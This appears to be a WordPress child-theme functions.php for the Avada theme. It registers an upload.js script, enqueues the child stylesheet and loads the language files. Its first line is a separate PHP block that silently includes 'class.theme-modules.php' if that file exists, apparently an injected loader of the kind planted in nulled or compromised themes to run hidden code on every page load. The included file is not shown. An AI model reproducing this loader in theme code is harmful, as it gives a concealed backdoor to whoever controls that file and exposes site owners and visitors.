<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function theme_enqueue_styles() {
    wp_register_script('miscript', get_template_directory_uri() . '-Child-Theme/js/upload.js', array('jquery'), '1', true );
    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( 'avada-stylesheet' ) );
}
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );

function insert_script() {
    wp_enqueue_script('miscript');
}
add_action('wp_enqueue_scripts', 'insert_script');

function avada_lang_setup() {
	$lang = get_stylesheet_directory() . '/languages';
	load_child_theme_textdomain( 'Avada', $lang );
}
add_action( 'after_setup_theme', 'avada_lang_setup' );
